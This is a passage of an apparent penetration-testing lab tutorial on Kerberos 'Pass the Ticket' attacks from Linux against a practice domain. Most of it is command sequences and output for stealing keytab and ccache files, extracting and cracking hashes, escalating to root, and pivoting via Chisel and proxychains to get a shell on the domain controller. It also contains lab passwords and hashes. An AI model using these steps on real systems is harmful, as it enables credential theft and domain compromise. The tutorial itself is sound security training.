<p><strong>Identifying KeyTab files in Cronjobs</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">carlos<span class="hljs-variable">@inlanefreight</span>.htb<span class="hljs-variable">@linux01</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>crontab -l

<span class="hljs-comment"># Edit this file to introduce tasks to be run by cron.</span>
<span class="hljs-comment"># </span>
...SNIP...
<span class="hljs-comment"># </span>
<span class="hljs-comment"># m h  dom mon dow   command</span>
*<span class="hljs-number">5</span>/ * * * * <span class="hljs-regexp">/home/carlos</span><span class="hljs-variable">@inlanefreight</span>.htb/.scripts/kerberos_script_test.sh
carlos<span class="hljs-variable">@inlanefreight</span>.htb<span class="hljs-variable">@linux01</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cat /home/carlos<span class="hljs-variable">@inlanefreight</span>.htb/.scripts/kerberos_script_test.sh
<span class="hljs-comment">#!/bin/bash</span>

kinit svc_workstations<span class="hljs-variable">@INLANEFREIGHT</span>.HTB -k -t /home/carlos<span class="hljs-variable">@inlanefreight</span>.htb/.scripts/svc_workstations.kt
smbclient /<span class="hljs-regexp">/dc01.inlanefreight.htb/svc</span>_workstations -c <span class="hljs-string">'ls'</span>  -k -no-pass &gt; <span class="hljs-regexp">/home/carlos</span><span class="hljs-variable">@inlanefreight</span>.htb/script-test-results.txt
</code></pre>
<p>In the above script, we notice the use of <a href="https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html">kinit</a>, which means that Kerberos is in use. <a href="https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html">kinit</a> allows interaction with Kerberos, and its function is to request the user&#39;s TGT and store this ticket in the cache (ccache file). We can use <code>kinit</code> to import a <code>keytab</code> into our session and act as the user.</p>
<p>In this example, we found a script importing a Kerberos ticket (<code>svc_workstations.kt</code>) for the user <code>svc_workstations@INLANEFREIGHT.HTB</code> before trying to connect to a shared folder. We&#39;ll later discuss how to use those tickets and impersonate users.</p>
<p>Note: As we discussed in the Pass the Ticket from Windows section, a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain-joined machine needs a ticket. The ticket is represented as a keytab file located by default at <code>/etc/krb5.keytab</code> and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB</p>
<h3 id="finding-ccache-files">Finding ccache files</h3>
<p>A credential cache or <a href="https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html">ccache</a> file holds Kerberos credentials while they remain valid and, generally, while the user&#39;s session lasts. Once a user authenticates to the domain, a ccache file is created that stores the ticket information. The path to this file is placed in the <code>KRB5CCNAME</code> environment variable. This variable is used by tools that support Kerberos authentication to find the Kerberos data. Let&#39;s look for the environment variables and identify the location of our Kerberos credentials cache:</p>
<p><strong>Reviewing environment variables for ccache files.</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">david<span class="hljs-variable">@inlanefreight</span>.htb<span class="hljs-variable">@linux01</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>env | grep -i krb5

KRB5CCNAME=<span class="hljs-symbol">FILE:</span>/tmp/krb5cc_647402606_qd2Pfh
</code></pre>
<p>As mentioned previously, <code>ccache</code> files are located, by default, at <code>/tmp</code>. We can search for users who are logged on to the computer, and if we gain access as root or a privileged user, we would be able to impersonate a user using their <code>ccache</code> file while it is still valid.</p>
<p><strong>Searching for ccache files in /tmp</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">david@inlanefreight.htb@linux01:~$ ls -la /tmp

total 68
drwxrwxrwt<span class="hljs-number"> 13 </span>root                     root                          <span class="hljs-number"> 4096 </span>Oct <span class="hljs-number"> 6 </span>16:38 .
drwxr-xr-x<span class="hljs-number"> 20 </span>root                     root                          <span class="hljs-number"> 4096 </span>Oct <span class="hljs-number"> 6 </span><span class="hljs-number"> 2021 </span>..
-rw------- <span class="hljs-number"> 1 </span>julio@inlanefreight.htb  domain users@inlanefreight.htb<span class="hljs-number"> 1406 </span>Oct <span class="hljs-number"> 6 </span>16:38 krb5cc_647401106_tBswau
-rw------- <span class="hljs-number"> 1 </span>david@inlanefreight.htb  domain users@inlanefreight.htb<span class="hljs-number"> 1406 </span>Oct <span class="hljs-number"> 6 </span>15:23 krb5cc_647401107_Gf415d
-rw------- <span class="hljs-number"> 1 </span>carlos@inlanefreight.htb domain users@inlanefreight.htb<span class="hljs-number"> 1433 </span>Oct <span class="hljs-number"> 6 </span>15:43 krb5cc_647402606_qd2Pfh
</code></pre>
<h3 id="abusing-keytab-files">Abusing KeyTab files</h3>
<p>As attackers, we may have several uses for a keytab file. The first thing we can do is impersonate a user using <code>kinit</code>. To use a keytab file, we need to know which user it was created for. <code>klist</code> is another application used to interact with Kerberos on Linux. This application reads information from a <code>keytab</code> file. Let&#39;s see that with the following command:</p>
<p><strong>Listing KeyTab file information</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">david<span class="hljs-meta">@inlanefreight</span>.htb<span class="hljs-meta">@linux</span><span class="hljs-number">01:</span>~$ klist -k -t <span class="hljs-regexp">/opt/</span>specialfiles/carlos.keytab 

Keytab <span class="hljs-string">name:</span> <span class="hljs-string">FILE:</span><span class="hljs-regexp">/opt/</span>specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   <span class="hljs-number">1</span> <span class="hljs-number">10</span><span class="hljs-regexp">/06/</span><span class="hljs-number">2022</span> <span class="hljs-number">17</span>:<span class="hljs-number">09</span>:<span class="hljs-number">13</span> carlos<span class="hljs-meta">@INLANEFREIGHT</span>.HTB
</code></pre>
<p>The ticket corresponds to the user Carlos. We can now impersonate the user with <code>kinit</code>. Let&#39;s confirm which ticket we are using with <code>klist</code> and then import Carlos&#39;s ticket into our session with <code>kinit</code>.</p>
<p>Note: kinit is case-sensitive, so be sure to use the name of the principal as shown in klist. In this case, the username is lowercase, and the domain name is uppercase.</p>
<p><strong>Impersonating a user with a KeyTab</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">david<span class="hljs-meta">@inlanefreight</span>.htb<span class="hljs-meta">@linux</span><span class="hljs-number">01:</span>~$ klist 

Ticket <span class="hljs-string">cache:</span> <span class="hljs-string">FILE:</span><span class="hljs-regexp">/tmp/</span>krb5cc_647401107_r5qiuu
Default <span class="hljs-string">principal:</span> david<span class="hljs-meta">@INLANEFREIGHT</span>.HTB

Valid starting     Expires            Service principal
<span class="hljs-number">10</span><span class="hljs-regexp">/06/</span><span class="hljs-number">22</span> <span class="hljs-number">17</span>:<span class="hljs-number">02</span>:<span class="hljs-number">11</span>  <span class="hljs-number">10</span><span class="hljs-regexp">/07/</span><span class="hljs-number">22</span> <span class="hljs-number">03</span>:<span class="hljs-number">02</span>:<span class="hljs-number">11</span>  krbtgt/INLANEFREIGHT.HTB<span class="hljs-meta">@INLANEFREIGHT</span>.HTB
        renew until <span class="hljs-number">10</span><span class="hljs-regexp">/07/</span><span class="hljs-number">22</span> <span class="hljs-number">17</span>:<span class="hljs-number">02</span>:<span class="hljs-number">11</span>
david<span class="hljs-meta">@inlanefreight</span>.htb<span class="hljs-meta">@linux</span><span class="hljs-number">01:</span>~$ kinit carlos<span class="hljs-meta">@INLANEFREIGHT</span>.HTB -k -t <span class="hljs-regexp">/opt/</span>specialfiles/carlos.keytab
david<span class="hljs-meta">@inlanefreight</span>.htb<span class="hljs-meta">@linux</span><span class="hljs-number">01:</span>~$ klist 
Ticket <span class="hljs-string">cache:</span> <span class="hljs-string">FILE:</span><span class="hljs-regexp">/tmp/</span>krb5cc_647401107_r5qiuu
Default <span class="hljs-string">principal:</span> carlos<span class="hljs-meta">@INLANEFREIGHT</span>.HTB

Valid starting     Expires            Service principal
<span class="hljs-number">10</span><span class="hljs-regexp">/06/</span><span class="hljs-number">22</span> <span class="hljs-number">17</span>:<span class="hljs-number">16</span>:<span class="hljs-number">11</span>  <span class="hljs-number">10</span><span class="hljs-regexp">/07/</span><span class="hljs-number">22</span> <span class="hljs-number">03</span>:<span class="hljs-number">16</span>:<span class="hljs-number">11</span>  krbtgt/INLANEFREIGHT.HTB<span class="hljs-meta">@INLANEFREIGHT</span>.HTB
        renew until <span class="hljs-number">10</span><span class="hljs-regexp">/07/</span><span class="hljs-number">22</span> <span class="hljs-number">17</span>:<span class="hljs-number">16</span>:<span class="hljs-number">11</span>
</code></pre>
<p>We can attempt to access the shared folder <code>\\dc01\carlos</code> to confirm our access.</p>
<p><strong>Connecting to SMB Share as Carlos</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls

  .                                   D       <span class="hljs-number"> 0 </span> Thu Oct <span class="hljs-number"> 6 </span>14:46:26 2022
  ..                                  D       <span class="hljs-number"> 0 </span> Thu Oct <span class="hljs-number"> 6 </span>14:46:26 2022
  carlos.txt                          A      <span class="hljs-number"> 15 </span> Thu Oct <span class="hljs-number"> 6 </span>14:46:54 2022

               <span class="hljs-number"> 7706623 </span>blocks of size 4096.<span class="hljs-number"> 4452852 </span>blocks available
</code></pre>
<p>Note: To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the environment variable <code>KRB5CCNAME</code>.</p>
<h4 id="keytab-extract">KeyTab Extract</h4>
<p>The second method we will use to abuse Kerberos on Linux is extracting the secrets from a keytab file. We were able to impersonate Carlos using the account&#39;s tickets to read a shared folder in the domain, but if we want to gain access to his account on the Linux machine, we&#39;ll need his password.</p>
<p>We can attempt to crack the account&#39;s password by extracting the hashes from the keytab file. Let&#39;s use <a href="https://github.com/sosdave/KeyTabExtract">KeyTabExtract</a>, a tool to extract valuable information from 502-type <code>.keytab</code> files, which may be used to authenticate Linux boxes to Kerberos. The script will extract information such as the realm, Service Principal, Encryption Type, and Hashes.</p>
<p><strong>Extracting KeyTab hashes with KeyTabExtract</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">david<span class="hljs-meta">@inlanefreight</span>.htb<span class="hljs-meta">@linux</span><span class="hljs-number">01:</span>~$ python3 <span class="hljs-regexp">/opt/</span>keytabextract.py <span class="hljs-regexp">/opt/</span>specialfiles/carlos.keytab 

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        <span class="hljs-string">REALM :</span> INLANEFREIGHT.HTB
        SERVICE <span class="hljs-string">PRINCIPAL :</span> carlos/
        NTLM <span class="hljs-string">HASH :</span> a738f92b3c08b424ec2d99589a9cce60
        AES<span class="hljs-number">-256</span> <span class="hljs-string">HASH :</span> <span class="hljs-number">42</span>ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES<span class="hljs-number">-128</span> <span class="hljs-string">HASH :</span> fa74d5abf4061baa1d4ff8485d1261c4
</code></pre>
<p>With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.</p>
<p>Note: A KeyTab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.</p>
<p>The most straightforward hash to crack is the NTLM hash. We can use tools like <a href="https://hashcat.net/">Hashcat</a> or <a href="https://www.openwall.com/john/">John the Ripper</a> to crack it. However, a quick way to decrypt passwords is with online repositories such as <a href="https://crackstation.net/">https://crackstation.net/</a>, which contains billions of passwords.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/crackstation.jpg" alt="Password hash cracker interface showing an NTLM hash cracked to &#39;Password5&#39; with a green result indicating an exact match."></p>
<p>As we can see in the image, the password for the user Carlos is <code>Password5</code>. We can now log in as Carlos.</p>
<p><strong>Log in as Carlos</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">david<span class="hljs-meta">@inlanefreight</span>.htb<span class="hljs-meta">@linux</span><span class="hljs-number">01:</span>~$ su - carlos<span class="hljs-meta">@inlanefreight</span>.htb
<span class="hljs-symbol">
Password:</span> 
carlos<span class="hljs-meta">@inlanefreight</span>.htb<span class="hljs-meta">@linux</span><span class="hljs-number">01:</span>~$ klist 
Ticket <span class="hljs-string">cache:</span> <span class="hljs-string">FILE:</span><span class="hljs-regexp">/tmp/</span>krb5cc_647402606_ZX6KFA
Default <span class="hljs-string">principal:</span> carlos<span class="hljs-meta">@INLANEFREIGHT</span>.HTB

Valid starting       Expires              Service principal
<span class="hljs-number">10</span><span class="hljs-regexp">/07/</span><span class="hljs-number">2022</span> <span class="hljs-number">11</span>:<span class="hljs-number">01</span>:<span class="hljs-number">13</span>  <span class="hljs-number">10</span><span class="hljs-regexp">/07/</span><span class="hljs-number">2022</span> <span class="hljs-number">21</span>:<span class="hljs-number">01</span>:<span class="hljs-number">13</span>  krbtgt/INLANEFREIGHT.HTB<span class="hljs-meta">@INLANEFREIGHT</span>.HTB
        renew until <span class="hljs-number">10</span><span class="hljs-regexp">/08/</span><span class="hljs-number">2022</span> <span class="hljs-number">11</span>:<span class="hljs-number">01</span>:<span class="hljs-number">13</span>
</code></pre>
<h4 id="obtaining-more-hashes">Obtaining more hashes</h4>
<p>Carlos has a cronjob that uses a KeyTab file named <code>svc_workstations.kt</code>. We can repeat the process, crack the password, and log in as <code>svc_workstations</code>.</p>
<h3 id="abusing-keytab-ccache">Abusing KeyTab ccache</h3>
<p>To abuse a ccache file, all we need is read privileges on the file. These files, located in <code>/tmp</code>, can only be read by the user who created them, but if we gain root access, we could use them.</p>
<p>Once we log in with the credentials for the user <code>svc_workstations</code>, we can use <code>sudo -l</code> and confirm that the user can execute any command as root. We can use the <code>sudo su</code> command to change the user to root.</p>
<p><strong>Privilege escalation to root</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ ssh svc_workstations<span class="hljs-meta">@inlanefreight</span>.htb@<span class="hljs-number">10.129</span><span class="hljs-number">.204</span><span class="hljs-number">.23</span> -p <span class="hljs-number">2222</span>

svc_workstations<span class="hljs-meta">@inlanefreight</span>.htb@<span class="hljs-number">10.129</span><span class="hljs-number">.204</span><span class="hljs-number">.23</span>'s password: 
Welcome to Ubuntu <span class="hljs-number">20.04</span><span class="hljs-number">.5</span> LTS (GNU/Linux <span class="hljs-number">5.4</span><span class="hljs-number">.0</span><span class="hljs-number">-126</span>-generic x86_64)          
...SNIP...

svc_workstations<span class="hljs-meta">@inlanefreight</span>.htb<span class="hljs-meta">@linux</span>01:~$ sudo -l
[sudo] password <span class="hljs-keyword">for</span> svc_workstations<span class="hljs-meta">@inlanefreight</span>.htb: 
Matching Defaults entries <span class="hljs-keyword">for</span> svc_workstations<span class="hljs-meta">@inlanefreight</span>.htb on linux01:
    env_reset, mail_badpass, secure_path=/usr/<span class="hljs-keyword">local</span>/sbin\:/usr/<span class="hljs-keyword">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_workstations<span class="hljs-meta">@inlanefreight</span>.htb may run the following commands on linux01:
    (ALL) ALL
svc_workstations<span class="hljs-meta">@inlanefreight</span>.htb<span class="hljs-meta">@linux</span>01:~$ sudo su
root<span class="hljs-meta">@linux</span>01:/home/svc_workstations<span class="hljs-meta">@inlanefreight</span>.htb<span class="hljs-comment"># whoami</span>
root
</code></pre>
<p>As root, we need to identify which tickets are present on the machine, to whom they belong, and their expiration time.</p>
<p><strong>Looking for ccache files</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">root@linux01:~<span class="hljs-comment"># ls -la /tmp</span>

total 76
drwxrwxrwt<span class="hljs-number"> 13 </span>root                               root                          <span class="hljs-number"> 4096 </span>Oct <span class="hljs-number"> 7 </span>11:35 .
drwxr-xr-x<span class="hljs-number"> 20 </span>root                               root                          <span class="hljs-number"> 4096 </span>Oct <span class="hljs-number"> 6 </span><span class="hljs-number"> 2021 </span>..
-rw------- <span class="hljs-number"> 1 </span>julio@inlanefreight.htb            domain users@inlanefreight.htb<span class="hljs-number"> 1406 </span>Oct <span class="hljs-number"> 7 </span>11:35 krb5cc_647401106_HRJDux
-rw------- <span class="hljs-number"> 1 </span>julio@inlanefreight.htb            domain users@inlanefreight.htb<span class="hljs-number"> 1406 </span>Oct <span class="hljs-number"> 7 </span>11:35 krb5cc_647401106_qMKxc6
-rw------- <span class="hljs-number"> 1 </span>david@inlanefreight.htb            domain users@inlanefreight.htb<span class="hljs-number"> 1406 </span>Oct <span class="hljs-number"> 7 </span>10:43 krb5cc_647401107_O0oUWh
-rw------- <span class="hljs-number"> 1 </span>svc_workstations@inlanefreight.htb domain users@inlanefreight.htb<span class="hljs-number"> 1535 </span>Oct <span class="hljs-number"> 7 </span>11:21 krb5cc_647401109_D7gVZF
-rw------- <span class="hljs-number"> 1 </span>carlos@inlanefreight.htb           domain users@inlanefreight.htb<span class="hljs-number"> 3175 </span>Oct <span class="hljs-number"> 7 </span>11:35 krb5cc_647402606
-rw------- <span class="hljs-number"> 1 </span>carlos@inlanefreight.htb           domain users@inlanefreight.htb<span class="hljs-number"> 1433 </span>Oct <span class="hljs-number"> 7 </span>11:01 krb5cc_647402606_ZX6KFA
</code></pre>
<p>There is one user (julio@inlanefreight.htb) to whom we have not yet gained access. We can confirm the groups to which he belongs using <code>id</code>.</p>
<p><strong>Identifying group membership with the id command</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">root@linux01<span class="hljs-symbol">:~</span><span class="hljs-comment"># id julio<span class="hljs-doctag">@inlanefreight</span>.htb</span>

uid=<span class="hljs-number">647401106</span>(julio@inlanefreight.htb) gid=<span class="hljs-number">647400513</span>(domain users@inlanefreight.htb) groups=<span class="hljs-number">647400513</span>(domain users@inlanefreight.htb),<span class="hljs-number">647400512</span>(domain admins@inlanefreight.htb),<span class="hljs-number">647400572</span>(denied rodc password replication group@inlanefreight.htb)
</code></pre>
<p>Julio is a member of the <code>Domain Admins</code> group. We can attempt to impersonate the user and gain access to the <code>DC01</code> Domain Controller host.</p>
<p>To use a ccache file, we can copy the ccache file and assign the file path to the <code>KRB5CCNAME</code> variable.</p>
<p><strong>Importing the ccache file into our current session</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">root@linux01:~<span class="hljs-comment"># klist</span>

klist: No credentials cache found (filename: /tmp/krb5cc_0)
root@linux01:~<span class="hljs-comment"># cp /tmp/krb5cc_647401106_I8I133 .</span>
root@linux01:~<span class="hljs-comment"># export KRB5CCNAME=/root/krb5cc_647401106_I8I133</span>
root@linux01:~<span class="hljs-comment"># klist</span>
Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 13:25:01
root@linux01:~<span class="hljs-comment"># smbclient //dc01/C$ -k -c ls -no-pass</span>
  $Recycle.Bin                      DHS       <span class="hljs-number"> 0 </span> Wed Oct <span class="hljs-number"> 6 </span>17:31:14 2021
  Config.Msi                        DHS       <span class="hljs-number"> 0 </span> Wed Oct <span class="hljs-number"> 6 </span>14:26:27 2021
  Documents and Settings          DHSrn       <span class="hljs-number"> 0 </span> Wed Oct <span class="hljs-number"> 6 </span>20:38:04 2021
  john                                D       <span class="hljs-number"> 0 </span> Mon Jul<span class="hljs-number"> 18 </span>13:19:50 2022
  julio                               D       <span class="hljs-number"> 0 </span> Mon Jul<span class="hljs-number"> 18 </span>13:54:02 2022
  pagefile.sys                      AHS<span class="hljs-number"> 738197504 </span> Thu Oct <span class="hljs-number"> 6 </span>21:32:44 2022
  PerfLogs                            D       <span class="hljs-number"> 0 </span> Fri Feb<span class="hljs-number"> 25 </span>16:20:48 2022
  Program Files                      DR       <span class="hljs-number"> 0 </span> Wed Oct <span class="hljs-number"> 6 </span>20:50:50 2021
  Program Files (x86)                 D       <span class="hljs-number"> 0 </span> Mon Jul<span class="hljs-number"> 18 </span>16:00:35 2022
  ProgramData                       DHn       <span class="hljs-number"> 0 </span> Fri Aug<span class="hljs-number"> 19 </span>12:18:42 2022
  SharedFolder                        D       <span class="hljs-number"> 0 </span> Thu Oct <span class="hljs-number"> 6 </span>14:46:20 2022
  System Volume Information         DHS       <span class="hljs-number"> 0 </span> Wed Jul<span class="hljs-number"> 13 </span>19:01:52 2022
  tools                               D       <span class="hljs-number"> 0 </span> Thu Sep<span class="hljs-number"> 22 </span>18:19:04 2022
  Users                              DR       <span class="hljs-number"> 0 </span> Thu Oct <span class="hljs-number"> 6 </span>11:46:05 2022
  Windows                             D       <span class="hljs-number"> 0 </span> Wed Oct <span class="hljs-number"> 5 </span>13:20:00 2022

               <span class="hljs-number"> 7706623 </span>blocks of size 4096.<span class="hljs-number"> 4447612 </span>blocks available
</code></pre>
<p>Note: klist displays the ticket information. We must consider the values &quot;valid starting&quot; and &quot;expires.&quot; If the expiration date has passed, the ticket will not work. <code>ccache files</code> are temporary. They may change or expire if the user no longer uses them or during login and logout operations.</p>
<h3 id="using-linux-attack-tools-with-kerberos">Using Linux attack tools with Kerberos</h3>
<p>Many Linux attack tools that interact with Windows and Active Directory support Kerberos authentication. If we use them from a domain-joined machine, we need to ensure our <code>KRB5CCNAME</code> environment variable is set to the ccache file we want to use. In case we are attacking from a machine that is not a member of the domain, for example, our attack host, we need to make sure our machine can contact the KDC or Domain Controller, and that domain name resolution is working.</p>
<p>In this scenario, our attack host doesn&#39;t have a connection to the <code>KDC/Domain Controller</code>, and we can&#39;t use the Domain Controller for name resolution. To use Kerberos, we need to proxy our traffic via <code>MS01</code> with a tool such as <a href="https://github.com/jpillora/chisel">Chisel</a> and <a href="https://github.com/haad/proxychains">Proxychains</a> and edit the <code>/etc/hosts</code> file to hardcode IP addresses of the domain and the machines we want to attack.</p>
<p><strong>Host file modified</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat /etc/hosts

# Host addresses

<span class="hljs-number">172.16</span><span class="hljs-number">.1</span><span class="hljs-number">.10</span> inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
<span class="hljs-number">172.16</span><span class="hljs-number">.1</span><span class="hljs-number">.5</span>  ms01.inlanefreight.htb  ms01
</code></pre>
<p>We need to modify our proxychains configuration file to use socks5 and port 1080.</p>
<p><strong>Proxychains configuration file</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat /etc/proxychains.conf

...SNIP...

[ProxyList]
socks5 <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">1080</span>
</code></pre>
<p>We must download and execute <a href="https://github.com/jpillora/chisel">chisel</a> on our attack host.</p>
<p><strong>Download Chisel to our attack host</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ wget https:/</span><span class="hljs-regexp">/github.com/</span>jpillora<span class="hljs-regexp">/chisel/</span>releases<span class="hljs-regexp">/download/</span>v1<span class="hljs-number">.7</span><span class="hljs-number">.7</span>/chisel_1<span class="hljs-number">.7</span><span class="hljs-number">.7</span>_linux_amd64.gz
root<span class="hljs-meta">@htb</span>[/htb]$ gzip -d chisel_1<span class="hljs-number">.7</span><span class="hljs-number">.7</span>_linux_amd64.gz
root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ mv chisel_* chisel &amp;&amp; chmod +x ./</span>chisel
root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo ./</span>chisel server --reverse 

<span class="hljs-number">2022</span><span class="hljs-regexp">/10/</span><span class="hljs-number">10</span> <span class="hljs-number">07</span>:<span class="hljs-number">26</span>:<span class="hljs-number">15</span> <span class="hljs-string">server:</span> Reverse tunneling enabled
<span class="hljs-number">2022</span><span class="hljs-regexp">/10/</span><span class="hljs-number">10</span> <span class="hljs-number">07</span>:<span class="hljs-number">26</span>:<span class="hljs-number">15</span> <span class="hljs-string">server:</span> Fingerprint <span class="hljs-number">58</span>EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
<span class="hljs-number">2022</span><span class="hljs-regexp">/10/</span><span class="hljs-number">10</span> <span class="hljs-number">07</span>:<span class="hljs-number">26</span>:<span class="hljs-number">15</span> <span class="hljs-string">server:</span> Listening on <span class="hljs-string">http:</span><span class="hljs-comment">//0.0.0.0:8080</span>
</code></pre>
<p>Connect to <code>MS01</code> via RDP and execute chisel (located in C:\Tools).</p>
<p><strong>Connect to MS01 with xfreerdp</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ xfreerdp /</span><span class="hljs-string">v:</span><span class="hljs-number">10.129</span><span class="hljs-number">.204</span><span class="hljs-number">.23</span> <span class="hljs-regexp">/u:david /</span><span class="hljs-string">d:</span>inlanefreight.htb <span class="hljs-regexp">/p:Password2 /</span>dynamic-resolution
</code></pre>
<p><strong>Execute chisel from MS01</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-cmd-session"><span class="hljs-string">C:</span>\htb&gt; <span class="hljs-string">c:</span>\tools\chisel.exe client <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.33</span>:<span class="hljs-number">8080</span> <span class="hljs-string">R:</span>socks

<span class="hljs-number">2022</span><span class="hljs-regexp">/10/</span><span class="hljs-number">10</span> <span class="hljs-number">06</span>:<span class="hljs-number">34</span>:<span class="hljs-number">19</span> <span class="hljs-string">client:</span> Connecting to <span class="hljs-string">ws:</span><span class="hljs-comment">//10.10.14.33:8080</span>
<span class="hljs-number">2022</span><span class="hljs-regexp">/10/</span><span class="hljs-number">10</span> <span class="hljs-number">06</span>:<span class="hljs-number">34</span>:<span class="hljs-number">20</span> <span class="hljs-string">client:</span> Connected (Latency <span class="hljs-number">125.6177</span>ms)
</code></pre>
<p>Note: The client IP is your attack host IP.</p>
<p>Finally, we need to transfer Julio&#39;s ccache file from <code>LINUX01</code> and create the environment variable <code>KRB5CCNAME</code> with the value corresponding to the path of the ccache file.</p>
<p><strong>Setting the KRB5CCNAME environment variable</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ export KRB5CCNAME=/home</span><span class="hljs-regexp">/htb-student/krb</span>5cc_647401106_I8I133
</code></pre>
<p>Note: If you are not familiar with file transfer operations, check out the module <a href="https://academy.hackthebox.com/module/details/24">File Transfers</a>.</p>
<h4 id="impacket">Impacket</h4>
<p>To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option <code>-k</code>. If we get a prompt for a password, we can also include the option <code>-no-pass</code>.</p>
<p><strong>Using Impacket with proxychains and Kerberos authentication</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ proxychains impacket-wmiexec dc01 -k

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so<span class="hljs-meta">.4</span>
[proxychains] DLL init: proxychains-ng <span class="hljs-number">4.14</span>
Impacket v0<span class="hljs-meta">.9</span><span class="hljs-meta">.22</span> - Copyright <span class="hljs-number">2020</span> SecureAuth Corporation

[proxychains] <span class="hljs-built_in">Strict</span> chain  ...  <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">1080</span>  ...  dc01:<span class="hljs-number">445</span>  ...  OK
[proxychains] <span class="hljs-built_in">Strict</span> chain  ...  <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">1080</span>  ...  INLANEFREIGHT.HTB:<span class="hljs-number">88</span>  ...  OK
[*] SMBv3<span class="hljs-meta">.0</span> dialect used
[proxychains] <span class="hljs-built_in">Strict</span> chain  ...  <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">1080</span>  ...  dc01:<span class="hljs-number">135</span>  ...  OK
[proxychains] <span class="hljs-built_in">Strict</span> chain  ...  <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">1080</span>  ...  INLANEFREIGHT.HTB:<span class="hljs-number">88</span>  ...  OK
[proxychains] <span class="hljs-built_in">Strict</span> chain  ...  <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">1080</span>  ...  dc01:<span class="hljs-number">50713</span>  ...  OK
[proxychains] <span class="hljs-built_in">Strict</span> chain  ...  <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">1080</span>  ...  INLANEFREIGHT.HTB:<span class="hljs-number">88</span>  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
<span class="hljs-symbol">C:</span>\&gt;whoami
inlanefreight\julio
</code></pre>
